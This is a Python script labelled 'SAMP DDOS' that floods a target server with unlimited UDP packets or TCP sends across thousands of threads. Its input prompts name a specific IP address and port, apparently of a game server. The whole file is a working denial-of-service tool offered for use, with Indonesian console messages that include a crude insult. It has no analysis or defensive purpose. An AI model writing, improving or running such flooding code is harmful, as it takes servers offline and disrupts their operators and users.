#!/usr/bin/env python3
import random
import socket
import threading
import os
import sys

os.system("clear")
print("Tools by Phoenix")
print("#-- SAMP DDOS --#")
ip = str(input(" IP:149.18.62.75"))
port = int(input(" Port:7008"))
choice = str(input(" UDP(y/n):y"))
times = int(input(" Paket yang dikirim :99999"))
threads = int(input(" Utas (saran : 99999) :99999"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" PAKET FROM OCTRA NIH DEK")
		except:
			print("YAH GAK KUAT KONTOL")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" PAKET FROM OCTRA NIH DEK")
		except:
			s.close()
			print("YAH GAK KUAT KONTOL")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
